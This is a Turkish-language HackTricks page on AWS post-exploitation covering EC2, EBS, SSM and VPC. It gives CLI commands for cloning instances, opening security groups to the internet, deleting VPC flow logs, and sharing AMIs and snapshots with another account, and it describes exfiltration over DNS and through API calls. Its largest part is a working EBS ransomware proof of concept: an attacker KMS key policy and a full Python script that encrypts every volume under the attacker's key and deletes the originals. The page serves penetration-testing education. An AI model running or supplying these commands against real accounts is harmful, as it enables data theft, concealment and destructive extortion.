# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Daha fazla bilgi için kontrol edin:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Kötü Amaçlı VPC Aynası -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC trafik aynalama **bir VPC içindeki EC2 örnekleri için gelen ve giden trafiği çoğaltır** ve bu işlemi örneklerin kendisine herhangi bir şey yüklemeye gerek kalmadan gerçekleştirir. Bu çoğaltılmış trafik genellikle analiz ve izleme için bir ağ saldırı tespit sistemi (IDS) gibi bir yere gönderilir.\
Bir saldırgan, bunu kullanarak tüm trafiği yakalayabilir ve hassas bilgilere ulaşabilir:

Daha fazla bilgi için bu sayfayı kontrol edin:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Çalışan Örneği Kopyala

Örnekler genellikle bazı hassas bilgileri içerir. İçeri girmek için farklı yollar vardır (bakınız [EC2 ayrıcalık yükseltme hileleri](../../aws-privilege-escalation/aws-ec2-privesc.md)). Ancak, içeriğin ne içerdiğini kontrol etmenin bir diğer yolu **bir AMI oluşturmak ve ondan yeni bir örnek çalıştırmaktır (hatta kendi hesabınızda bile)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Anlık görüntüler, hacimlerin yedekleridir**, genellikle **hassas bilgiler** içerecektir, bu nedenle bunları kontrol etmek bu bilgileri açığa çıkarabilir.\
Eğer **anlık görüntüsü olmayan bir hacim** bulursanız: **Bir anlık görüntü oluşturabilir** ve aşağıdaki işlemleri gerçekleştirebilir veya sadece **bir örneğe monte edebilirsiniz**:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Veri Sızdırma

#### DNS Sızdırma

Bir EC2'yi dışarıya trafik çıkmayacak şekilde kilitleseniz bile, hala **DNS üzerinden sızdırabilir**.

- **VPC Akış Günlükleri bunu kaydetmeyecek**.
- AWS DNS günlüklerine erişiminiz yok.
- Bunu, "enableDnsSupport" değerini false olarak ayarlayarak devre dışı bırakın:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### API çağrıları aracılığıyla sızdırma

Bir saldırgan, kendisi tarafından kontrol edilen bir hesabın API uç noktalarını çağırabilir. Cloudtrail bu çağrıları kaydedecek ve saldırgan, sızdırılan verileri Cloudtrail günlüklerinde görebilecektir.

### Açık Güvenlik Grubu

Ağ hizmetlerine daha fazla erişim elde etmek için portları şu şekilde açabilirsiniz:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Bir EC2 örneği çalıştırmak ve bunu ECS örneklerini çalıştırmak için kaydetmek mümkündür ve ardından ECS örneklerinin verilerini çalmak mümkündür.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Gerekli izinler:

- `ssm:StartSession`

Komut yürütmenin yanı sıra, SSM, Security Groups veya NACL'ler nedeniyle ağ erişimi olmayan EC2 örneklerinden geçiş yapmak için kötüye kullanılabilecek trafik tünellemesine olanak tanır. Bunun faydalı olduğu senaryolardan biri, bir [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) üzerinden özel bir EKS kümesine geçiş yapmaktır.

> Bir oturum başlatmak için SessionManagerPlugin'in yüklü olması gerekir: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Makinenizde SessionManagerPlugin'i yükleyin
2. Aşağıdaki komutla Bastion EC2'ye giriş yapın:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Bastion EC2 AWS geçici kimlik bilgilerini [AWS EC2 ortamında SSRF'yi kötüye kullanma](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#abusing-ssrf-in-aws-ec2-environment) scripti ile al
4. Kimlik bilgilerini kendi makinenize `$HOME/.aws/credentials` dosyasına `[bastion-ec2]` profili olarak aktar
5. Bastion EC2 olarak EKS'e giriş yap:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. `$HOME/.kube/config` dosyasındaki `server` alanını `https://localhost` olarak güncelleyin  
7. Aşağıdaki gibi bir SSM tüneli oluşturun:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. `kubectl` aracından gelen trafik artık Bastion EC2 üzerinden SSM tüneli aracılığıyla yönlendiriliyor ve kendi makinenizden özel EKS kümesine erişmek için şu komutu çalıştırabilirsiniz:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Not edin ki SSL bağlantıları, `--insecure-skip-tls-verify` bayrağını (veya K8s denetim araçlarındaki eşdeğerini) ayarlamazsanız başarısız olacaktır. Trafiğin güvenli AWS SSM tüneli üzerinden tünellendiğini göz önünde bulundurarak, herhangi bir MitM saldırısından güvendesiniz.

Son olarak, bu teknik özel EKS kümelerine saldırmak için spesifik değildir. Herhangi bir AWS hizmetine veya özel bir uygulamaya geçiş yapmak için keyfi alan adları ve portlar ayarlayabilirsiniz.

### AMI Paylaşımı
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Kamuya açık ve özel AMI'lerde hassas bilgileri arama

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel, **kamuya açık veya özel Amazon Machine Images (AMIs)** içinde hassas bilgileri aramak için tasarlanmış bir araçtır. Hedef AMI'lerden örnekler başlatma, hacimlerini bağlama ve potansiyel sırlar veya hassas veriler için tarama işlemini otomatikleştirir.

### EBS Anlık Görüntüsünü Paylaşma
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

S3 post-exploitation notlarında gösterilen Ransomware demonstrasyonuna benzer bir kavramsal kanıt. KMS, çeşitli AWS hizmetlerini şifrelemek için ne kadar kolay kullanıldığı göz önüne alındığında, Ransomware Yönetim Servisi (RMS) olarak yeniden adlandırılmalıdır.

Öncelikle bir 'saldırgan' AWS hesabından KMS'de bir müşteri yönetimli anahtar oluşturun. Bu örnek için, AWS'nin anahtar verilerini benim için yönetmesine izin vereceğiz, ancak gerçek bir senaryoda kötü niyetli bir aktör anahtar verilerini AWS'nin kontrolü dışında tutacaktır. Anahtar politikasını, herhangi bir AWS hesabı Prensipinin anahtarı kullanmasına izin verecek şekilde değiştirin. Bu anahtar politikası için, hesabın adı 'AttackSim' ve tüm erişime izin veren politika kuralı 'Dış Şifreleme' olarak adlandırılmıştır.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Anahtar politika kuralının, bir EBS hacmini şifrelemek için kullanılabilmesi adına aşağıdakilerin etkinleştirilmesi gerekmektedir:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Artık kullanılacak kamuya açık anahtar ile. Şifrelenmemiş EBS hacimleri ekli olan bazı EC2 örnekleri olan bir 'kurban' hesabı kullanabiliriz. Bu 'kurban' hesabının EBS hacimleri, şifreleme hedefimizdir; bu saldırı, yüksek ayrıcalıklı bir AWS hesabının ihlal edildiği varsayımı altında gerçekleştirilmektedir.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3 fidye yazılımı örneğine benzer şekilde. Bu saldırı, ekli EBS hacimlerinin kopyalarını anlık görüntüler kullanarak oluşturacak, 'saldırgan' hesabından kamuya açık anahtarı kullanarak yeni EBS hacimlerini şifreleyecek, ardından orijinal EBS hacimlerini EC2 örneklerinden ayıracak ve silecek, ve son olarak yeni şifrelenmiş EBS hacimlerini oluşturmak için kullanılan anlık görüntüleri silecektir. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Bu, hesapta yalnızca şifrelenmiş EBS hacimlerinin kalmasıyla sonuçlanır.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Ayrıca, scriptin EC2 örneklerini durdurduğunu ve orijinal EBS hacimlerini ayırıp sildiğini belirtmekte fayda var. Orijinal şifrelenmemiş hacimler artık yok.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Sonraki adım, 'saldırgan' hesabındaki anahtar politikasına geri dönmek ve anahtar politikasından 'Dışarıda Şifreleme' politika kuralını kaldırmaktır.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Biraz bekleyin, yeni ayarlanan anahtar politikasının yayılmasını bekleyin. Ardından 'kurban' hesabına geri dönün ve yeni şifrelenmiş EBS hacimlerinden birini eklemeyi deneyin. Hacmi ekleyebildiğinizi göreceksiniz.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Ancak şifrelenmiş EBS hacmi ile EC2 örneğini gerçekten başlatmayı denediğinizde, sadece başarısız olacak ve 'pending' durumundan 'stopped' durumuna sonsuza kadar geri dönecektir çünkü ekli EBS hacmi anahtar kullanılarak şifresi çözülemez, çünkü anahtar politikası artık buna izin vermiyor.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Bu, kullanılan python betiğidir. 'Kurban' hesabı için AWS kimlik bilgilerini ve şifreleme için kullanılacak anahtarın kamuya açık AWS ARN değerini alır. Betik, hedeflenen AWS hesabındaki Tüm EC2 örneklerine ekli Tüm mevcut EBS hacimlerinin şifrelenmiş kopyalarını oluşturacak, ardından her EC2 örneğini durduracak, orijinal EBS hacimlerini ayıracak, silecek ve nihayetinde işlem sırasında kullanılan tüm anlık görüntüleri silecektir. Bu, yalnızca hedef 'kurban' hesabında şifrelenmiş EBS hacimleri bırakacaktır. BU BETİĞİ SADECE BİR TEST ORTAMINDA KULLANIN, YIKICI VE TÜM ORİJİNAL EBS HACİMLERİNİ SİLECEKTİR. Kullanılan KMS anahtarı ile bunları geri alabilir ve anlık görüntüler aracılığıyla orijinal durumlarına geri yükleyebilirsiniz, ancak bunun bir fidye yazılımı PoC'si olduğunu bilmenizi isterim.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
{{#include ../../../../banners/hacktricks-training.md}}
